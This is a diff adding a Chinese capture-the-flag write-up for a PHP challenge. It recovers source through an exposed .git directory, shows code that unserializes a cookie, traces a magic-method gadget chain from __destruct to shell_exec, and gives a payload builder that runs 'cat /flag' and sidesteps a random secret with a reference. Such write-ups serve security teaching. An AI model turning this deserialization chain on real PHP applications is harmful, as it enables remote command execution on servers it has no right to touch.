@@ -526,7 +526,125 @@ print(flag2)
 ```
 
 ## 七狗收费小说
+题目提示，hit泄露，先获取源码  
+git-dumper http://127.0.0.1:59524/.git  
+拿到index.php  
+```python
+<?php
+// 小刻可是学了最新的 PHP 8 哦，快夸夸小刻
+error_reporting(0);
 
+class User
+{
+    public $username, $password;
+    public $secret_a, $secret_b;
+
+    public function __construct($username, $password)
+    {
+        $this->username = $username;
+        $this->password = $password;
+        $this->secret_a = $this->secret_b = 0;
+    }
+
+    public function __wakeup()
+    {
+        // 每次都要重新登录，这样坏人肯定进不来啦
+        $this->secret_b = random_int(1000_0000, 9999_9999);
+    }
+
+    public function __destruct()
+    {
+        if ($this->username !== $this->password)
+            die("不对，密码不对！");
+        if ($this->secret_a !== $this->secret_b)
+            die("不行，要重新登录！");
+
+        echo "已经登录啦：$this->username";
+    }
+}
+
+class UserInfo
+{
+    public $user, $permission;
+
+    public function __construct($user)
+    {
+        $this->user = $user;
+        $this->permission = $user->username === "admin" ? "权限 7" : "权限 0";
+    }
+
+    public function __tostring()
+    {
+        return $this->user->username . "（权限等级：" . $this->permission . "）";
+    }
+}
+
+class Diagnosis
+{
+    public $key, $value, $action;
+
+    public function __get($name)
+    {
+        if ($name === $this->key && is_object($this->action)) {
+            return ($this->action)($this->value);
+        }
+        return null;
+    }
+
+    public function __invoke($value)
+    {
+        return shell_exec("$this->key$value");
+    }
+}
+
+$curr_user = null;
+
+if (isset($_POST['username']) && isset($_POST['password'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $user = new User($username, $password);
+
+    $data = base64_encode(serialize($user));
+    setcookie('user', $data, time() + 3600, '/');
+    $curr_user = $user;
+
+} elseif (isset($_COOKIE['user'])) {
+    $data = base64_decode($_COOKIE['user']);
+    $curr_user = unserialize($data);
+}
+?>
+```
+考察反序列化，cookie传入参数user  
+链子触发顺序：  
+```python
+User::__destruct
+└─ echo $this->username
+   └─ UserInfo::__toString
+      └─ 访问 $this->user->username
+         └─ Diagnosis::__get("username")
+            └─ 调用 $this->action($this->value)
+               └─ Diagnosis::__invoke
+                  └─ shell_exec("$this->key$value")
+```
+payload  
+```python
+$a = new User('', '');
+
+$a->username = new UserInfo(new User('guest', 'guest'));
+$a->username->user = new Diagnosis();
+$a->username->user->key = 'username';
+$a->username->user->value = '';
+$a->username->user->action = new Diagnosis();
+$a->username->user->action->key = 'cat /flag';
+$a->username->user->action->value = '';
+
+$a->password = $a->username;
+$a->secret_a =& $a->secret_b;
+
+$payload = base64_encode(serialize($a));
+echo $payload;
+```
 ## 巧乐兹
 ## 千度网盘
 ## moe论坛
